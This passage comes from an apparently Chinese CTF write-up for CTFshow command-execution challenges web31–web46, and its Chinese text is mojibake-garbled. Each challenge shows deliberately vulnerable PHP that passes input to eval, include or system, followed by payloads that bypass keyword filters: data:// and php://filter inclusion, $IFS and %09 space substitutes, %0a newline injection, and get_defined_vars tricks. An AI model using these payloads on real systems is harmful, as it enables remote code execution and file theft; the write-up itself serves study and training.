</code></p><ul><li>å°†<code>system</code>è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸å…¶åŠŸèƒ½ç›¸åŒçš„å‡½æ•°ï¼Œå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœè¾“å‡ºå‡ºæ¥</li></ul><blockquote><p>exec()<br>shell_exec()&amp;(``)<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p></blockquote><h1 id="web31-å…³é”®å­—ç»•è¿‡"><a href="#web31-å…³é”®å­—ç»•è¿‡" class="headerlink" title="web31(å…³é”®å­—ç»•è¿‡)"></a>web31(å…³é”®å­—ç»•è¿‡)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=echo`tac%09f*`;</code></p><ul><li>è¿‡æ»¤äº†<code>cat</code>ï¼Œå¯ä»¥åˆ©ç”¨ä»¥ä¸‹å‡½æ•°</li></ul><blockquote><p>more     #ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less     #ä¸ more ç±»ä¼¼<br>head     #æŸ¥çœ‹å¤´å‡ è¡Œ<br>tac      #ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>tail     #æŸ¥çœ‹å°¾å‡ è¡Œ<br>nl       #æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>od       #ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>sort     #å¯ä»¥æŸ¥çœ‹<br>uniq     #å¯ä»¥æŸ¥çœ‹</p></blockquote><ul><li>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ç”¨å…¶å®ƒå­—ç¬¦æ›¿ä»£</li></ul><blockquote><p>&lt;<br>${IFS}<br>/**/<br>%09</p></blockquote><h1 id="web32-å…³é”®å­—ç»•è¿‡"><a href="#web32-å…³é”®å­—ç»•è¿‡" class="headerlink" title="web32(å…³é”®å­—ç»•è¿‡)"></a>web32(å…³é”®å­—ç»•è¿‡)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><ul><li>å‘ç°æœ¬é¢˜å°†å¤§éƒ¨åˆ†å‡½æ•°éƒ½è¿‡æ»¤äº†ï¼Œæ­£å¸¸çš„å‘½ä»¤æ‰§è¡Œä¹Ÿä¸å¤ªå®¹æ˜“ï¼Œè¿™æ—¶å€™å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œå°†æƒ³è¦è¯»å–çš„æ–‡ä»¶åˆ©ç”¨POSTæ•°æ®è¿›è¡Œä¼ é€’</li><li>å°†GETå‚æ•°è®¾ç½®ä¸ºincludeï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼ŒåŒ…å«çš„å†…å®¹å¯ä»¥ç”¨POSTä¼ å‚</li><li>åœ¨POSTä¸­åˆ©ç”¨ä¼ªåè®®è¯»å–æ•°æ®ï¼Œè¿›è¡Œè§£ç ï¼Œå¾—åˆ°flag</li><li><code>;</code>å¯ä»¥ç”¨<code>?&gt;</code> ä»£æ›¿</li></ul><h1 id="web33"><a href="#web33" class="headerlink" title="web33()"></a>web33()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>è¿‡æ»¤å†…å®¹æ¯”ä¸Šé¢˜è¿˜å¤šï¼Œä½†æ˜¯ä¸å½±å“ä¸Šé“é¢˜çš„payloadï¼Œæ‰€ä»¥payloadè·Ÿä¸Šé¢˜ä¸€æ ·</p><h1 id="web34"><a href="#web34" class="headerlink" title="web34()"></a>web34()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><ul><li>payloadå’Œä¸Šé¢˜ä¸€æ ·</li></ul><h1 id="web35"><a href="#web35" class="headerlink" title="web35()"></a>web35()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>åˆè¿‡æ»¤äº†<code>&lt;</code>å’Œ<code>=</code>ï¼Œä¸è¿‡å½±å“ä¸å¤§ï¼Œä¸Šé“é¢˜çš„payloadä¾æ—§èƒ½ç”¨</p><h1 id="web36"><a href="#web36" class="headerlink" title="web36()"></a>web36()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[a]?&gt;    POST: a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>åˆè¿‡æ»¤äº†æ•°å­—ï¼Œåªéœ€è¦å°†ä¸Šé“é¢˜çš„POSTå‚æ•°æ”¹æˆå­—æ¯å³å¯</p><h1 id="web37-data"><a href="#web37-data" class="headerlink" title="web37(data://)"></a>web37(data://)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></p><p><code>data://</code> ä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„<code>data://</code>æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p><p>é€šè¿‡<code>data://</code>åè®®ï¼Œè¯»å–æ–‡ä»¶</p><h1 id="web38-lt"><a href="#web38-lt" class="headerlink" title="web38(&lt;?=)"></a>web38(&lt;?=)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=data://text/plain,&lt;?= system(&#39;cat f*&#39;);?&gt;</code></p><p>å‘ç°å°†Â·<code>php</code>è¿‡æ»¤äº†ï¼Œå¯åˆ©ç”¨<code>&lt;?=</code>ä»£æ›¿<code>&lt;?php</code></p><h1 id="web39"><a href="#web39" class="headerlink" title="web39()"></a>web39()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=data://text/plain,&lt;?= system(&#39;cat f*&#39;);?&gt;</code></p><p><code>data://text/plain,</code> è¿™æ ·å°±ç›¸å½“äºæ‰§è¡Œäº†phpè¯­å¥ .php å› ä¸ºå‰é¢çš„phpè¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„.phpä¼šè¢«å½“æˆhtmlé¡µé¢ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œèµ·ä¸åˆ°ä»€ä¹ˆ ä½œç”¨</p><h1 id="web40-ç›¸å…³å‡½æ•°"><a href="#web40-ç›¸å…³å‡½æ•°" class="headerlink" title="web40(ç›¸å…³å‡½æ•°)"></a>web40(ç›¸å…³å‡½æ•°)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»”ç»†è§‚å¯Ÿå‘ç°ï¼Œç¦ç”¨çš„æ˜¯ä¸­æ–‡æ‹¬å·ï¼Œè‹±æ–‡æ‹¬å·è¿˜æ˜¯å¯ä»¥ç”¨çš„</p><p>å…ˆæ‰“å°ä¸€ä¸‹æ‰€æœ‰å˜é‡çœ‹ä¸€ä¸‹</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40.png" alt=""></p><p>å‘ç°æœ‰POSTå˜é‡ï¼Œå°è¯•POSTéšä¾¿ä¼ <code>a=phpinfo();</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_01.png" alt=""></p><p>å‘ç°å¯ä»¥ä¼ è¿›å»ï¼Œ è¿™æ„å‘³ç€æˆ‘ä»¬å°±å¯ä»¥RCEäº†ï¼Œå…ˆç”¨<code>next()</code>å‡½æ•°æ‰¾åˆ°æŒ‡å®šæ•°ç»„ï¼ŒæˆåŠŸè¾“å‡º</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_02.png" alt=""></p><p>å†åˆ©ç”¨<code>current()</code>å‡½æ•°å°†å½“å‰å•å…ƒå€¼å–å‡ºæ¥</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_03.png" alt=""></p><p>æˆåŠŸï¼å°†<code>print_r</code>æ¢æˆ<code>eval</code>å°è¯•èƒ½å¦æ‰§è¡Œä»£ç </p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_04.png" alt=""></p><p>æˆåŠŸï¼Œæœ€ååªéœ€è¦æ›´æ”¹POSTå€¼æ¥å¯»æ‰¾flagå³å¯</p><p>æœ€ç»ˆpayload</p><p><code>?c=eval(current(next(get_defined_vars())));    POST: a=system(&#39;cat f*&#39;);</code></p><h1 id="web41-å¼‚æˆ–"><a href="#web41-å¼‚æˆ–" class="headerlink" title="web41(å¼‚æˆ–)"></a>web41(å¼‚æˆ–)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å­—æ¯å•¥çš„éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯<code>|</code>ç»™ç•™ä¸‹æ¥äº†ï¼Œè¿™å°±å¯ä»¥è¿›è¡Œæˆ–è¿ç®—æ¥æ‹¼å‡‘å‘½ä»¤</p><p>ä¹Ÿå¯ä»¥çœ‹æç¤ºï¼Œåˆ©ç”¨å¤§ä½¬çš„è„šæœ¬ï¼Œç›´æ¥è¿è¡Œå³å¯</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/41.png" alt=""></p><h1 id="web42"><a href="#web42" class="headerlink" title="web42()"></a>web42()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&gt;/dev/null</code>æ–‡ä»¶æè¿°ç¬¦ï¼Œå¾€é‡Œé¢è¾“å‡ºçš„æ‰€æœ‰æ•°æ®éƒ½ä¸ä¼šä¿å­˜</p><p>å¯ä»¥åˆ©ç”¨æ¢è¡Œç¬¦<code>%0a</code>ç»•è¿‡</p><p><code>paylaod: ?c=cat f*%0a</code></p><h1 id="web43"><a href="#web43" class="headerlink" title="web43()"></a>web43()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac f*%0a</code></p><p> è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œç¦ç”¨äº†<code>cat</code>ï¼Œå¯ä»¥ç”¨å®ƒçš„æ›¿æ¢å‡½æ•°è¿™é‡Œç”¨çš„<code>tac</code></p><h1 id="web44"><a href="#web44" class="headerlink" title="web44()"></a>web44()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac f*%0a</code></p><p>åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>flag</code>ï¼Œå¯ä»¥åˆ©ç”¨æ­£åˆ™åŒ¹é…ç»•è¿‡</p><h1 id="web45"><a href="#web45" class="headerlink" title="web45()"></a>web45()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac$IFS*%0a</code></p><p>ä¾æ—§æ˜¯è¿‡æ»¤ï¼Œè¿™æ¬¡å¤šäº†ä¸ªç©ºæ ¼ï¼Œåˆ©ç”¨<code>$IFS</code>ç»•è¿‡</p><h1 id="web46"><a href="#web46" class="headerlink" title="web46()"></a>web46()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: 